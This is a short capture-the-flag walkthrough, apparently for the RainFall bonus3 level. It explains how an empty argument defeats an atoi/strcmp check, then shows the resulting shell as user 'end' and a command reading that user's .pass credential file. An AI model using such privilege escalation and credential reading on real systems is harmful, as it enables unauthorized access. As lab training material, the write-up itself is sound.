After reversing the program, we can see there is a vulnerability :

buf[atoi(argv[1])]
strcmp(buf, argv[1]) == 0

if argv[1] is empty (./bonus "") atoi will return 0 and strcmp will compare
two empty strings and 0 will be returned. The condition is fulfilled and
a shell opens logged as 'end'

bonus3@RainFall:~$ ./bonus3 ""
$ whoami
end
$ cat /home/user/end/.pass
